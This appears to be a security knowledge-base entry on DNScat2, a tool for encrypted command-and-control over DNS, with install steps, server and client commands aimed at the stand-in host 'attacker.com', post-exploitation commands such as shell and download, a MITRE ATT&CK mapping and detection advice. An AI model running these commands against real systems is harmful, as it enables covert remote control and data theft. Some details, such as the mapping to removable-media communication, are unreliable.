---
id: 43da057b-d88f-4e74-bcb3-7dc0c92c4168
type: tool
verified: true
created_at: '2019-08-28T21:17:19.843907+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Linux
  - Windows
  - macOS
tags:
  - c2
  - dns-tunneling
  - command-and-control
url: 'https://github.com/iagox86/dnscat2'
validated: true
---

# DNScat2

**Status**: Verified

## Overview

DNScat2 is a metastructure tool for creating an encrypted command-and-control (C2) channel over the DNS protocol. It is particularly useful in penetration testing scenarios where firewalls or network policies block traditional outbound connections like HTTP or TCP, allowing attackers to maintain persistence and execute commands via seemingly innocuous DNS traffic.

## Description

DNScat2 operates as a client-server architecture where the server runs on the attacker's machine (controlling a domain's DNS resolution), and the client runs on the compromised target. The client encodes commands and data into DNS queries, which are resolved by the attacker's DNS server, enabling bidirectional communication. It supports interactive shells, file transfers, screenshots (on supported platforms), and other post-exploitation activities, all encrypted to evade detection.

## Features

- **Encrypted DNS Tunneling**: All C2 traffic is encrypted and tunneled over DNS, making it hard to detect without deep packet inspection.
- **Interactive Sessions**: Provides a console-like interface for executing commands on the target.
- **File Transfer**: Supports uploading and downloading files over the DNS channel.
- **Multi-Client Support**: Handles multiple simultaneous client connections.
- **Platform Agnostic**: Clients available for Windows, Linux, and other platforms via Ruby or compiled binaries.
- **Extensibility**: Modules for additional functionality like keylogging or port scanning.

## Installation

### Requirements

- Ruby 1.9.3 or higher
- Bundler gem
- Git
- Control over a domain and its DNS server (e.g., via a VPS with BIND or PowerDNS)

### Install Commands

```bash
# Clone the repository
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2

# Install dependencies
bundle install

# For client binaries (optional, for non-Ruby targets)
# Follow build instructions in the repo for Windows/Linux executables
```

On Kali Linux, it may be available via apt: `apt install dnscat2`, but building from source is recommended for the latest version.

## Basic Usage

```ruby
ruby dnscat2-server.rb --help
```

### Common Options

| Option | Description |
|--------|-------------|
| `--domain` | Specify the domain for DNS resolution |
| `--ip` | Bind to a specific IP (default: all interfaces) |
| `--port` | DNS server port (default: 53) |
| `--secret` | Pre-shared key for encryption |

## Examples

### Example 1: Basic Usage

Start the server:

```ruby
ruby dnscat2-server.rb attacker.com
```

On the target, run the client (assuming Ruby is available):

```ruby
ruby dnscat2-client attacker.com 192.168.1.100
```

### Example 2: Advanced Usage

Start server with custom port and secret:

```ruby
ruby dnscat2-server.rb attacker.com --port 5353 --secret mykey
```

Connect client with matching secret:

```ruby
ruby dnscat2-client attacker.com 192.168.1.100 --secret mykey
```

Once connected, use commands like `shell` for an interactive shell, `download file.txt` for file transfer, or `screenshot` for captures.

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[T1071.004]] Application Layer Protocol: DNS
- [[Protocol Tunneling]] Protocol Tunneling
- [[Communication Through Removable Media]] Communication Through Removable Media (for payload delivery)

### Tactics

- [[Command and Control]] Command And Control
- [[Defense Evasion]] Defense Evasion

## Detection

Indicators and methods for detecting this tool's usage:

- **Anomalous DNS Traffic**: High volume of TXT or NULL record queries to a single domain, unusually long subdomains (DNScat2 uses base64-like encoding).
- **DNS Query Patterns**: Frequent, non-standard queries from internal hosts to external DNS servers not used for legitimate resolution.
- **Process Monitoring**: Ruby processes (ruby.exe on Windows) with network activity to DNS ports.
- **Network Logs**: Look for encrypted payloads in DNS responses exceeding typical sizes (e.g., >255 bytes per label).
- **Behavioral Analytics**: Internal hosts initiating connections to attacker-controlled domains.
- **Tools**: Use Zeek (Bro) for DNS logging, Suricata rules for DNS tunneling signatures, or commercial NDR solutions.

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[tools/Cobalt Strike]] (Advanced C2 framework with DNS support)
- [[dns2tcp]] (Similar DNS tunneling tool)
- [[iodine]] (Another DNS tunnel implementation)

## References

- Official GitHub: https://github.com/iagox86/dnscat2
- Blog Post by Author: https://www.iagox86.com/tag/dnscat2/
- MITRE ATT&CK: https://attack.mitre.org/techniques/T1071/004/
- Detection Guide: https://www.fireeye.com/blog/threat-research/2017/04/detecting-dnscat2.html
